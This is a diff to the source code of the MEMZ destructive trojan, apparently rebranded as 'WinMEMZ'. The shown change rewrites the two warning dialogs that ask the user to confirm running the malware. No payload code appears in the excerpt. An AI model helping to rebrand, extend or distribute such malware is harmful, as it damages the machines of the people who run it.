@@ -35,15 +35,15 @@ void start() {
 		}
 	} else {
 		// Another very ugly formatting
-		if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
+		if (MessageBoxA(NULL, "The exe you just open contains malware by the name of WinMEMZ!\r\n\
 This malware will harm your computer and makes it unusable.\r\n\
 If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
 If you know what this malware does and are using a safe environment to test, \
 press Yes to start it.\r\n\r\n\
-DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
-MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
+DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "WinMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
+MessageBoxA(NULL, "WOAH WOAH WOAH, BUDDY! ARE YOU SURE YOU WOULD LIKE TO RUN THIS MALWARE?\r\n\r\n\
 THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
-STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
+STILL EXECUTE IT?", "WinMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 			ExitProcess(0);
 		}
 
